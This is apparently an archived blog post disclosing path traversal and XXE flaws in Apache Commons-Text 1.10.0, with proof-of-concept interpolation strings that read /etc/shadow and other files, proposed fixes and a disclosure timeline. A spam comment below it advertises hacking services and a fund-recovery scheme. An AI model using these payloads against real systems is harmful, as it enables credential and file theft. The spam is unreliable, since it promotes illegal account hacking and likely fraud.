---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-05-30_vulnerabilities-in-apache-commons-text-1100.md
original_filename: 2023-05-30_vulnerabilities-in-apache-commons-text-1100.md
title: Vulnerabilities In Apache Commons-Text 1.10.0
category: documents
detected_topics:
- supply-chain
- command-injection
- path-traversal
- mfa
- otp
- automation-abuse
tags:
- imported
- documents
- supply-chain
- command-injection
- path-traversal
- mfa
- otp
- automation-abuse
language: en
raw_sha256: a0c03ca835491a24fd2e0e68e83b9cee7d3c12bd5494ba48f74b06969b15d5f1
text_sha256: d843e83fbc2d9aa57218d7748deca606f72bbefc2a2324e08945bbff3752b2fe
ingested_at: '2026-06-28T07:32:21Z'
sensitivity: unknown
redactions_applied: false
---

# Vulnerabilities In Apache Commons-Text 1.10.0

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-05-30_vulnerabilities-in-apache-commons-text-1100.md
- Source Type: markdown
- Detected Topics: supply-chain, command-injection, path-traversal, mfa, otp, automation-abuse
- Ingested At: 2026-06-28T07:32:21Z
- Redactions Applied: False
- Raw SHA256: `a0c03ca835491a24fd2e0e68e83b9cee7d3c12bd5494ba48f74b06969b15d5f1`
- Text SHA256: `d843e83fbc2d9aa57218d7748deca606f72bbefc2a2324e08945bbff3752b2fe`


## Content

---
title: "Vulnerabilities In Apache Commons-Text 1.10.0"
url: "https://mc0wn.blogspot.com/2023/05/vulnerabilities-in-apache-commons-text.html"
final_url: "https://mc0wn.blogspot.com/2023/05/vulnerabilities-in-apache-commons-text.html"
authors: ["Chris (@mc_0wn)"]
programs: ["Apache Commons Text"]
bugs: ["Path traversal", "XXE"]
publication_date: "2023-05-30"
added_date: "2023-06-05"
source: "pentester.land/writeups.json"
original_index: 1103
---

###  Vulnerabilities In Apache Commons-Text 1.10.0 

  * Get link
  * Facebook
  * X
  * Pinterest
  * Email
  * Other Apps

\-  [ May 30, 2023  ](https://mc0wn.blogspot.com/2023/05/vulnerabilities-in-apache-commons-text.html "permanent link")

# Vulnerabilities In 

# Apache Commons-Text 1.10.0

## Abstract

In October 2022 a vulnerability in Apache Commons-Text was reported ([CVE-2022-42889](https://securitylab.github.com/advisories/GHSL-2022-018_Apache_Commons_Text/)) dubbed "Text4Shell". This vulnerability, while less prevalent, acted somewhat similar to log4shell which used interpolators to perform string lookups on user defined input that resulted in code execution. Like most software, there's often other related issue(s) found in neighboring code that don't get fixed when a big issue like this is reported. This blog is on those other vulnerabilities. 

## Background 

CVE-2022-42889 "Text4Shell" was centered on an unsafe script evaluation found in the ScriptStringLookup. A POC looked like the following (seen at [GHSL-2022-018](https://securitylab.github.com/advisories/GHSL-2022-018_Apache_Commons_Text/)):

  

  
  
  final StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
  String out = interpolator.replace("${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}");
  System.out.println(out);

  

Where the value in the replace() function is a user supplied value that triggers the script interpolator function. The script interpolator then evaluated the supplied javascript, resulting in the execution of unexpected code. 

  

This was 'fixed' in 1.10.0 by removing various [interpolators](https://commons.apache.org/proper/commons-text/userguide.html#text.lookup) from the default setup found in the [commit](https://github.com/apache/commons-text/commit/b9b40b903e2d1f9935039803c9852439576780ea). 

As commons-text team [pointed out](https://commons.apache.org/proper/commons-text/security.html), users of this library may pass values without proper sanitization and for that reason decided to update the configuration to be more "secure by default". 

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjcoXRcVPIbNSe83xKkeT8gIxGYVHE_OT-5IUwc-UfMBOtbINjA0JyxDbgsSpA9LtfnbL7KgjEwtN6tzCEPDoEBIOerTePNs6TXb1hl2JFb2A8J8DcKFY5vZG4uLVllT4WMfQWSJOQ71bh_FGNvyyblrv3E7_8sFE1_2g398TUJ2NiuNzCilVMxONRyzA/w640-h333/removedinterpolators.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjcoXRcVPIbNSe83xKkeT8gIxGYVHE_OT-5IUwc-UfMBOtbINjA0JyxDbgsSpA9LtfnbL7KgjEwtN6tzCEPDoEBIOerTePNs6TXb1hl2JFb2A8J8DcKFY5vZG4uLVllT4WMfQWSJOQ71bh_FGNvyyblrv3E7_8sFE1_2g398TUJ2NiuNzCilVMxONRyzA/s1066/removedinterpolators.png)

  

At this point most people viewed this as fixed and moved on. However, I got interested in reviewing what other vulnerabilities could exist in the other interpolator functions that weren't removed. While I didn't find an RCE, out of the box, I did find some interesting security vulnerabilities that in most applications would be a huge problem. 

  

## Vulnerability Analysis

#### XMLStringLookup

First finding I discovered was in the XMLStringLookup. Looking at the code I noticed it didn't validate the xml being passed nor did it block external entity processing. It just reads the file and passes it to XPathFactory to parse. 

**  
**
  
  
  **return** XPathFactory._newInstance_().newXPath().evaluate(xpath, **new** InputSource(inputStream));
  
  
  
  
  XPathImpl ultimately calls DomParser directly without any xxe protections:
  
  
  
  
   DocumentBuilderFactory dbf = FactoryImpl._getDOMFactory_(useServiceMechanism);
  
              dbf.setNamespaceAware(**true**);
  
              dbf.setValidating(**false**);
  
              **return** dbf.newDocumentBuilder().parse(source);

  

This means if I could control the xml file being used and point to it in the replace function I could use an XXE vulnerability to steal information via [file exfiltration](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration) from a target application to an external server or cause a DoS

  

POC Example 1 :
  
  
  ${xml:xxe.xml:test}

  

Looking further I noticed this function contained a path traversal. This meant you could point to any xml file on the system. So if the application using the library uploaded files to some location you could use those xml files. 

  

POC Example 2:
  
  
  ${xml:../../../../../tmp/xxe.xml:test}

  

While researching this issue I noticed other xxe payloads could be used like error-based file exfiltration like the one [@frycos](https://twitter.com/frycos/status/1630671386313207809) came up with here. In that situation the desired file could be leaked in the error message. Since lots of java web applications often leak stacktraces, this would likely work well. 

  

#### PropertiesStringLookup

Next I looked up the list of interpolators and noticed the properties function also accepted a file path and also didn't validate the paths being passed to it. The properties function then takes in a file doesn't validate it, but effectively converts it into a key-value map and the interpolator will provide you the value of the key you are looking for. 

  

So to get the root password from the shadow file all you needed to do was the following.

  

POC Example 3:
  
  
  ${properties:../../../../../../../../etc/shadow::root}

  

#### FileStringLookup

After noticing all the previous issues, I decided to take a look finally at the file interpolator. Similar to the others it also didn't validate the path being passed to it. So you could traverse the whole system to find any file and return the entire contents of that file:

  

POC Example 4:
  
  
  ${file:UTF-8:../../../../../../../../etc/shadow}

  

On Windows systems you could even specify the drive and directly path to the file. Also found by [Strio](https://issues.apache.org/jira/projects/TEXT/issues/TEXT-220)

  

POC Example 5:
  
  
  ${file:UTF-8:C:/Windows/System32/Drivers/etc/hosts}
  
  
  ${file:UTF-8:D:/testfile}

  

Or even use UNC Path to access files on connected servers

  

POC Example 6:
  
  
  ${file:UTF-8://servera/testfile}

  

#### Chaining Lookups

Looking further I noticed the ability to chain lookups. In order to chain lookups you need to have setEnableSubstitutionInVariables to true 
  
  
  StringSubstitutor str =  StringSubstitutor.createInterpolator();
  
  str.setEnableSubstitutionInVariables(true);
  
  str.replace("${properties:http://127.0.0.1:8000/${file:UTF-8:../../../../../Windows/System32/drivers/etc/hosts}}")
  
  
  
  
  
  
  
  Outputs: ...
  
  # localhost name resolution is handled within DNS itself.
  
  #	127.0.0.1       localhost
  
  #	] and key [1             localhost
  
  
  
  
  127.0.0.1 localhost
  
  # End of section
  
  ].
  
  at org.apache.commons.text.lookup.IllegalArgumentExceptions.format(IllegalArgumentExceptions.java:49)
  
  at org.apache.commons.text.lookup.PropertiesStringLookup.lookup(PropertiesStringLookup.java:107)
  
  at org.apache.commons.text.lookup.InterpolatorStringLookup.lookup(InterpolatorStringLookup.java:127)
  
  at org.apache.commons.text.StringSubstitutor.resolveVariable(StringSubstitutor.java:1148)
  
  at org.apache.commons.text.StringSubstitutor.substitute(StringSubstitutor.java:1514)
  
  at org.apache.commons.text.StringSubstitutor.substitute(StringSubstitutor.java:1389)
  
  at org.apache.commons.text.StringSubstitutor.replace(StringSubstitutor.java:893)
  
  
  

  

## Partial Fix

Here's a few ideas around fixes that could help harden these issues that I also shared with Apache Commons-Text. 

  

For all path traversal issues use something like the following:
  
  
  File file = **new** File(documentPath);
  
  
  
  
  **if** (!file.getAbsolutePath().equals(file.getCanonicalPath())) {
  
        **throw** **new** IOException("Absolute path not equal to canonical path");
  
  }
  
  
  

  

For the xxe issue add this to XMLStringLookup to disallow doctype
  
  
  **   try** {
  
          	
  
          	File file = **new** File(documentPath);
  
  
  
  
          	**if** (!file.getAbsolutePath().equals(file.getCanonicalPath())) {
  
          	        **throw** **new** IOException("Absolute path not equal to canonical path");
  
          	}
  
          	
  
          	InputStream inputStream = Files._newInputStream_(Paths._get_(documentPath));
  
          	DocumentBuilderFactory docBuilderFactory = DocumentBuilderFactory._newInst ance_();
  
          	
  
          	docBuilderFactory.setFeature("[http://apache.org/xml/features/disallow-doctype-decl](http://apache.org/xml/features/disallow-doctype-decl)", **true**);
  
          	docBuilderFactory.setXIncludeAware(**false**);
  
          	
  
          	DocumentBuilder docBuilder = docBuilderFactory.newDocumentBuilder();
  
          	Document xmlDocument = docBuilder.parse(inputStream);
  
          	
  
              **return** XPathFactory._newInstance_().newXPath().evaluate(xpath, xmlDocument);
  
              
  
          } **catch** (**final** Exception e) {
  
              **throw** IllegalArgumentExceptions._form at_(e, "Error looking up XML document [%s] and XPath [%s].",
  
                  documentPath, xpath);
  
          } 
  
  
  

  

  
The path traversal should also have further hardening, like limiting to just files in the package directory/doc root by default and allowing users to open this restriction based on their configuration.
  
  
  ### Timeline
  
  ### 
  
  * Sep 24th 2022 - 1.10.0 Released with fix for CVE-2022-42889
  * Oct 14th  2022 - Reached out to share vulnerability
  * Oct 28th 2022 - Shared details of XXE issue
  * Mar 10th 2023 - Apache Commons Text team informed me they don't consider this a security vulnerability because this is a "low-level" library and its the responsibility of the application to sanitize the input.
  * May 5th 2023 - Provided all other vulnerabilities and code hardening fixes to Apache Commons Text team
  * May 6th 2023 - Apache Commons Text team informed me they still don't consider these security vulnerabilities and pointed me to https://commons.apache.org/security.html which as of April 20 2023 was updated to say _"The Commons libraries are low-level libraries that are typically designed to work with input that is either trusted or validated/sanitized by the application using the library. It is not safe to provide possibly-malicious input to Commons libraries unless otherwise specified."_
  
  

  

  

  * Get link
  * Facebook
  * X
  * Pinterest
  * Email
  * Other Apps

### Comments

  1. ![](//blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiAEL-_-xL8Z5KJHfajrnCemKK7Nug-UPc3RgDKx_40Dm-XFmKF_5QSu534W15Fo6_lNz9fEjRpKVNKdmF0zUJOXQO8CjT3GeqbfpsdvpxOpdITos22df7u6Uznke38/s45-c/photo-1522075469751-3a6694fb2f61.jpg)

[JacobHarman](https://www.blogger.com/profile/09102185005661698772)[July 9, 2023 at 2:43 PM](https://mc0wn.blogspot.com/2023/05/vulnerabilities-in-apache-commons-text.html?showComment=1688939019011#c2699236414542472991)

Wallet improvement includes making programming applications that permit clients to store, make due, and execute with their Ethereum-based resources, like Ether (ETH) and ERC-20 tokens. Ethereum wallets can be executed as online applications, portable applications, or work area applications.  
  
A critical part of Ethereum wallet improvement is guaranteeing the security of clients' confidential keys, which give admittance to their Ethereum resources. This commonly includes executing encryption and secure stockpiling procedures to shield private keys from burglary or misfortune>> [ethereum application development](https://mobilunity.com/blog/hire-top-ethereum-developers-remotely-in-2023/)

Reply[Delete](https://www.blogger.com/comment/delete/1700540390836215996/2699236414542472991)

Replies

Reply

  2. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[Nazrul](https://www.blogger.com/profile/08762813502046466863)[September 2, 2023 at 10:57 AM](https://mc0wn.blogspot.com/2023/05/vulnerabilities-in-apache-commons-text.html?showComment=1693677424434#c845300545586849209)

This comment has been removed by the author.

Reply[Delete](https://www.blogger.com/comment/delete/1700540390836215996/845300545586849209)

Replies

Reply

  3. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[ALICE](https://www.blogger.com/profile/03696558331540331527)[December 8, 2024 at 6:32 PM](https://mc0wn.blogspot.com/2023/05/vulnerabilities-in-apache-commons-text.html?showComment=1733711548232#c8517628226259387161)

⚠️ Did you loose money to Cryptocurrency Investment, Forex Trading, Binary Option 📈 📉 or too any kind of Scam❗❕⁉️  
  
Then You Should Conatct PYTHONAX Immediately ✔✔  
  
ℹ PYTHONAX offer you a chance of recovering money you lost to this kind of scam, we are highly skilled with using transaction information to get back your money lost to this kind of Scams.  
  
📢 The internet today is full of such kinda scams that promises a high profits returns, and when you decide to give it a shot, they just keep demanding for money of your money. This scams are very convincing with their promises and can even offer you a demo account trial, only to refuse to give you your product and your invested capital when you put in your money.  
  
✅ Majority of cases we have dealt with, it turned out to be that the website used isn't even a legit Cryptocurrency or Forex trading platforms, every money you sent isn't in the website as the website isn't backed to the blockchain or stock market. Your money is just sitting their in the scams wallets or account.  
  
⭐ Our services are simple and easy, as all wee need is proof of this scam, means of payment used and details of the payment made. With this information, we can use our skill to recover your money, though the process isn't easy, and requires a lot of hacking tools and softwares, however we will get your money back to you. We give you our word.  
  
We also provide Hacking services such as-:  
▪️Hacking Devices, for those trying to catch a cheating partner.  
▪️Website Hacking, for those who need a copy of a file in a secure website or need something deleted from a website.  
▪️Emails & Social Media account Hacking.  
▪️Location tracking, both of past, current and later in the future.  
▪️Bitcoin Mining........etc  
  
Contact emails-:  
Pythonaxhelp@protonmail.com  
Pythonaxservices@protonmail.com  
  
  
2024, Pythonax Services ™️.  
Our reputation precedes us.  
All rights reserved ®️  
  
  
  
  
  
  
  
  

Reply[Delete](https://www.blogger.com/comment/delete/1700540390836215996/8517628226259387161)

Replies

Reply

Add comment

Load more...

#### Post a Comment

[](https://www.blogger.com/comment/frame/1700540390836215996?po=4523871977555699557&hl=en&saa=85391&origin=https://mc0wn.blogspot.com&skin=contempo)
